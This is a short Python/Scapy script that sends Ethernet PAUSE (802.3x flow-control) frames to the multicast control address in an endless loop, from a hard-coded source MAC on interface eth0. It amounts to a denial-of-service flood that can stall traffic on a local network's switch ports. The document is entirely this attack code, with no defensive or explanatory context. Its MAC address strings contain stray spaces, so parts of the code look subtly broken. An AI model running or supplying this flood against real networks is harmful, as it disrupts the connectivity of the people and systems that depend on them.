from scapy.all import *

while(1):
	data = '\x00\x01\xff\xfa' + '\xff' * 42 + '\xC2\x27\x97\x7B'
	pkt = Ether(src = "88: 51: fb: fe: 82: b3", dst = "01: 80: c2: 00: 00: 01", type = 0x8808 ) / data
	sendp(pkt, iface = "eth0")




#multicast pauze frame mac:     01-80-C2-00-00-01 01: 80: c2: 00: 00: 01



